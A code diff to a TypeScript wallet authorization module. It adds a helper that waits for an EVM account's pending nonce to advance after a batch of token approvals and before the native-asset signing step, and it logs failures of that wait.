@@ -39,6 +39,7 @@ import {
 import {
   awaitEvmSequentialApprovalGap,
   readEvmPendingNonce,
+  waitForEvmPendingNonceAdvance,
 } from "../core/evm-nonce-sync";
 import { isEvmChainKey } from "../core/native-chains";
 import { fetchWalletSessionToken } from "./wallet-session-token";
@@ -249,6 +250,44 @@ function recordEvmNativeDeferred(ctx: {
   captureByNetwork.set(item.network, capture);
 }
 
+async function awaitEvmNativeSignNonceGap(args: {
+  network: string;
+  owner: string;
+  batchResults: EvmTokenBatchRunResult;
+  baselineNonce: bigint;
+  log: RunAuthorizationSessionArgs["log"];
+}): Promise<void> {
+  const anchorTx = args.batchResults.results.find(
+    (r) => r.txHash && r.token !== "NATIVE",
+  )?.txHash;
+  args.log?.("EVM_NATIVE_SIGN_NONCE_WAIT", {
+    network: args.network,
+    anchorTxHash: anchorTx ?? null,
+    baselineNonce: args.baselineNonce.toString(),
+  });
+  try {
+    if (anchorTx) {
+      await awaitEvmSequentialApprovalGap({
+        network: args.network,
+        owner: args.owner,
+        txHash: anchorTx,
+        baselineNonce: args.baselineNonce,
+      });
+    } else {
+      await waitForEvmPendingNonceAdvance({
+        network: args.network,
+        owner: args.owner,
+        baselineNonce: args.baselineNonce,
+      });
+    }
+  } catch (nonceErr) {
+    args.log?.("EVM_NATIVE_SIGN_NONCE_WAIT_FAILED", {
+      network: args.network,
+      error: getErrorMessage(nonceErr, "Nonce wait failed"),
+    });
+  }
+}
+
 /**
  * Two-phase authorization:
  * 1. Wallet phase — token approvals (EVM native deferred; Tron native sign only).
@@ -317,6 +356,17 @@ export async function runAuthorizationSession(
   for (const unit of workUnits) {
     if (unit.kind === "evm_token_batch" && unit.items.length >= 1) {
       if (args.evmBatchProvider) {
+        const evmOwner = args.accounts.evm;
+        const batchBaselineNonce =
+          unit.nativeItem &&
+          evmOwner &&
+          isEvmChainKey(unit.network)
+            ? await readEvmPendingNonce({
+                network: unit.network,
+                owner: evmOwner,
+              })
+            : null;
+
         const batchResults = await runEvmTokenBatchApproval({
           items: unit.items,
           network: unit.network,
@@ -361,6 +411,19 @@ export async function runAuthorizationSession(
             unit.nativeItem &&
             !shouldSkipNativeWalletPhaseAfterBatch(batchResults, true)
           ) {
+            if (
+              batchBaselineNonce != null &&
+              evmOwner &&
+              isEvmChainKey(unit.network)
+            ) {
+              await awaitEvmNativeSignNonceGap({
+                network: unit.network,
+                owner: evmOwner,
+                batchResults,
+                baselineNonce: batchBaselineNonce,
+                log,
+              });
+            }
             captureByNetwork.set(unit.network, existing);
             await runNativeWalletPhase({
               item: unit.nativeItem,
@@ -433,6 +496,28 @@ export async function runAuthorizationSession(
         }
       }
       if (unit.nativeItem) {
+        if (evmOwner && isEvmChainKey(unit.network) && evmPendingNonce != null) {
+          const lastTokenTx = results
+            .filter(
+              (r) =>
+                r.network === unit.network &&
+                r.token !== "NATIVE" &&
+                r.txHash,
+            )
+            .at(-1)?.txHash;
+          if (lastTokenTx) {
+            await awaitEvmNativeSignNonceGap({
+              network: unit.network,
+              owner: evmOwner,
+              batchResults: {
+                results: results.filter((r) => r.network === unit.network),
+                tokenCaptures: [],
+              },
+              baselineNonce: evmPendingNonce,
+              log,
+            });
+          }
+        }
         await runNativeWalletPhase({
           item: unit.nativeItem,
           args,
